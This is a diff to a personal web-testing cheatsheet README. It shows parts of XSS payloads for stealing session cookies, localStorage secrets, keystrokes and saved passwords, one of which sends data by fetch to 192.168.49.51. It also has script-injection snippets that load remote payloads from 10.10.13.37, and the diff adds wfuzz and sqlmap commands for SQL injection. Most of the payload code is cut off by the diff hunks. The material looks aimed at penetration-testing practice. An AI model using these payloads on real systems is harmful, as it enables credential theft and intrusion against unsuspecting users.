@@ -1,8 +1,11 @@
 # Welcome to Useful-Shit/Web!
 
 Hi! This would probably be better as a gist, honestly. But it's my repo and I'll do what I want!
-This is basically just a web testing cheatsheet for me but if you find my stuff useful, a star would be appreciated😁
+This is basically just a web testing cheatsheet for me but if you find my stuff useful, a star would be appreciated 😁
 
+## Quick Jump:
+- [XSS](#xss-copypastas)
+- 
 
 # Cross-Site Scripting (XSS)
 
@@ -21,6 +24,7 @@ XSS Payloads for fun and profit. Different types of XSS:
 ### Stealing session cookies
 
 Leverage XSS to fetch the payload from a web server you control:
+`xss.js`
 
 ```javascript
 let cookie = document.cookie
@@ -35,6 +39,7 @@ This payload may not work if `HttpOnly` is specified in the server headers.
 ### Stealing local secrets
 
 Local storage may include secrets like API keys or personal user info. There are two types: `sessionStorage` and `localStorage` - session storage only holds data for the session, whereas `localStorage` is the local cache and won't be flushed until explicitly done so.
+`local.js`
 
 ```javascript
 let data = JSON.stringify(localStorage)
@@ -47,6 +52,7 @@ fetch("http://192.168.49.51/exfil?data=" + encodedData)
 ### Keylogging
 
 It's keylogging, but through XSS. Let's see what users are typing:
+`klog.js`
 
 ```javascript
 function logKey(event){
@@ -57,6 +63,7 @@ document.addEventListener('keydown', logKey);
 ```
 
 ### Stealing saved passwords
+`stealer.js`
 
 ```javascript
 let body = document.getElementsByTagName("body")[0]
@@ -103,3 +110,27 @@ fetch("login").then(res => res.text().then(data => {
  - External payload: `<script src="http://10.10.13.37/xss.js"></script>`
 
  - Insert script from external: `<img src='x' onerror='const script = document.createElement("script"); script.src="http://10.10.13.37/xss-login.js";document.head.append(script);'>`
+
+
+## SQL Injection (SQLi)
+
+### Fuzzing GET parameter
+```shell
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"
+```
+
+### Fuzzing POST parameter
+```shell
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php"
+```
+
+### sqlmap GET parameter
+```shell
+sqlmap -u "$URL/index.php?id=1"
+```
+
+### sqlmap POST parameter
+Copy POST request from Burp Suite into `post.txt` file
+```shell
+sqlmap -r post.txt -p parameter
+```
